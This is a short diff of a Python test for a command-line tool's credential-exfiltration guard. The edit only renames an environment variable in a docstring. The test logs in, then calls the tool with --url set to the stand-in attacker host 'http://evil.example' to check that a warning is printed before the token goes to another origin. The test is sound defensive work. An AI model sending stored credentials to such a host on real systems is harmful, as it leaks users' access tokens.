@@ -127,7 +127,7 @@ def test_print_access_token(harness):
 def test_credential_host_mismatch_warns(harness):
     """Sending a stored credential to a --url whose host differs from the profile
     URL host emits a stderr warning (warn-only - the call still proceeds). This is
-    the credential-exfil guard: a poisoned DFE_API_URL / stray --url would otherwise
+    the credential-exfil guard: a poisoned DFE_ENGINE_API_URL / stray --url would otherwise
     ship the active token to another origin silently."""
     harness.invoke(["login", "--url", "http://test", "--api-key", harness.admin_api_key])
     result = harness.invoke(["--url", "http://evil.example", "orgs", "list"])
